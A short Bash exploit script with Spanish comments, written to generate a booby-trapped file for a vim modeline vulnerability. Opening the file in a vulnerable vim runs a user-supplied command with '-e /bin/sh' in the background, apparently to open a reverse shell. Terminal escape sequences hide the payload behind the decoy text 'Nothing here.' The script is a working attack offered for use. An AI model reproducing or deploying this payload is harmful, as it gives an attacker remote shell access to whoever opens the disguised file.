#!/bin/bash
###############################################################################"
## Script: modeline.sh                                                       ##"
## Descripcion: Aprovecha la vulnerabilidad de vim para realizar un remote   ##"
##              shell.                                                       ##"
## Autor: Victor Mejia Lara                                                  ##"
## Version: 1.0                                                              ##"
## Licencia GPL v3                                                           ##"
###############################################################################"

if [ $# -eq 0 ]; then
	echo "Se requiere como minimo el comando a ejecutar"
	return 2
fi

printf "\\$(printf '%03o' 27)[?71"

printf "\\$(printf '%03o' 27)SNothing here. \\$(printf '%03o' 27):silent! w | call system(\'nohup "
echo -n "$* -e /bin/sh &') | redraw! | file | silent! # \" vim: set fen fdm=expr fde=assert_fails('set\ fde=x\ \|\ source\!\ \%') fdl=0: "

printf "\\$(printf '%03o' 22)\\$(printf '%03o' 27)[1G\\$(printf '%03o' 22)\\$(printf '%03o' 27)[KNothing here. \"\\$(printf '%03o' 22)\\$(printf '%03o' 27)[D \n"
